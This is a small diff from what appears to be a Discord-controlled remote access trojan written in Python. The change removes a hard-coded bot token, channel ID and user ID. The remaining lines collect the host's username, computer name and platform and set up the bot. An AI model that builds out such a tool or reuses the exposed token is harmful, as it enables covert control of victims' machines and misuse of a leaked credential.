@@ -9,7 +9,7 @@ ids = []
 #channel is the channel ID where updates will be sent
 #usid is the userID of the user
 #token is the token of your bot
-channel = 843737598504468490; usid = 360748438784180225; token = "ODM4NjI1MTY0OTQ1Nzg0ODQy.YI90jA.r1QEazpsw7OxtdBdMAHu2KrKH78"
+channel = ; usid = ; token = ""
 OS = plt.platform().split("-"); name = os.getenv("username"); Username = os.getenv("COMPUTERNAME")
 client = commands.Bot(command_prefix="null!"); client.remove_command("help")
 ratcwd = os.getcwd() # this keeps the original working dir in memory
